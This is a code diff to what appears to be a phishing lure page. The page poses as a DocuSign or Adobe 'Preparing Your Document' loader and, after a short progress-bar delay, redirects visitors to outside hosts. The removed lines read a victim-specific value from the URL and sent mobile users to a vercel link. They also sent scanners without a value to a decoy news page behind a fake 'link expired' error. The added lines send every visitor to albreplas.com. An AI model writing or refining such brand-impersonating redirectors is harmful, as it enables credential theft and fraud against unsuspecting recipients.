@@ -115,7 +115,7 @@
 <body>
     <div class="container">
         <div class="header">
-            <img src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" alt="DocuSign Logo" class="docusign-logo">
+           <img src="https://www.adobe.com/content/dam/cc/icons/adobe_wordmark_red.svg" alt="Adobe Icon" width="300px" height="70px">
             <h1 class="title">Preparing Your Document</h1>
             <p class="subtitle">Please wait a moment while we get things ready for you.</p>
         </div>
@@ -137,7 +137,7 @@
     <script>
     (function() {
         const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
-        const MOBILE_REDIRECT_URL_BASE = "https://jpg67688-21xqlixgf-bolsonaros-projects.vercel.app/090292jhjdcbudncujcvnjubcmhjbckuedbnckjdnc/index.html#";
+        const MOBILE_REDIRECT_URL_BASE = "https://albreplas.com/reader/";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
         const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
 
@@ -169,29 +169,15 @@
 
         // Main redirect function
         function performRedirect() {
-            const value = getPotentialValue();
-
-            if (value) {
-                console.log("Found value:", value);
-                if (isMobileDevice()) {
-                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+           if (isMobileDevice()) {
+                    const redirectUrl = MOBILE_REDIRECT_URL_BASE ;
                     console.log("Mobile device detected. Redirecting to:", redirectUrl);
                     window.location.href = redirectUrl;
                 } else {
-                     const redirectUrl = DESKTOP_REDIRECT_URL;
-                   
+                     const redirectUrl = MOBILE_REDIRECT_URL_BASE;
+                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
                     window.location.href = redirectUrl;
                 }
-            } else {
-                console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
-                document.querySelector('.loading-text').textContent = 'Error: Link invalid or expired.';
-                document.querySelector('.file-info').textContent = 'Please check the link or contact support.';
-                if(document.getElementById('progressBar')) {
-                    document.getElementById('progressBar').style.backgroundColor = '#d9534f'; // Error color
-                    document.getElementById('progressBar').style.width = '100%';
-                }
-                // No redirect if no value, error is shown on page
-            }
         }
 
         // Execute redirect after a short delay
